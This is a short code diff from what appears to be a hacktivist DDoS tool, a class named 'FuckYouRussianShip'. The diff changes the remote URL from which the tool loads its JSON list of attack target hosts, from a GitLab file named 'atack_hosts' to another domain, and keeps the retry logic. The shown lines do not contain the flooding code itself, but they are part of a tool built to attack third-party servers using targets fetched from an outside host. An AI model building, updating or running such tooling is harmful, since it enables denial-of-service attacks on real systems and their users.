@@ -57,11 +57,11 @@ class FuckYouRussianShip:
 
         try:
             self.HOSTS = json.loads(
-                requests.get("https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
+                requests.get("https://hutin-puy.nadom.app/hosts.json").content)
         except Exception:
             sleep(5)
             self.HOSTS = json.loads(
-                requests.get("https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
+                requests.get("https://hutin-puy.nadom.app/hosts.json").content)
 
         global work_statistic
         global statistic
